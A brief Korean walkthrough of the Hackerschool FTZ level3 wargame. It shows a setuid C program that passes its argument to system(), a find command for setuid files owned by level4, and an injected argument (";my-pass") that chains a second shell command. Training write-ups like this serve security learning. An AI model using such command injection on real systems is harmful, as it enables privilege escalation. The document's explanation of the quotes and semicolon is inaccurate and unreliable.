# Hackserschool FTZ level3

-  앞서 한것처럼 hint를찾으면
~~~c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv){

    char cmd[100];

    if( argc!=2 ){
        printf( "Auto Digger Version 0.9\n" );
        printf( "Usage : %s host\n", argv[0] );
        exit(0);
    }

    strcpy( cmd, "dig @" );
    strcat( cmd, argv[1] );
    strcat( cmd, " version.bind chaos txt");

    system( cmd );

}
~~~
---

    이를 이용하여 level4의 권한을 얻어라.

    more hints.

    -동시에 여러 명령어를 사용하려면?

    -문자열 형태로 명령어를 전달하려면?

이라는 힌트가 나오는데 

- 우선 level4권한을 찾으면 
    > find / -user level4 -perm -4000 2>/dev/null
    >>/bin/autodig 

    가나오는데 
    이것을 실행해야 하는데 2개의 txt형식의 변수를 입력해야 하기 때문에  **";my-pass"**
    를 입력하면 된다.

    *이때 ""의 의미는 문자열 형식*
    
    *그리고 ;는 1개이상의 수를 입력할때 사용*

    



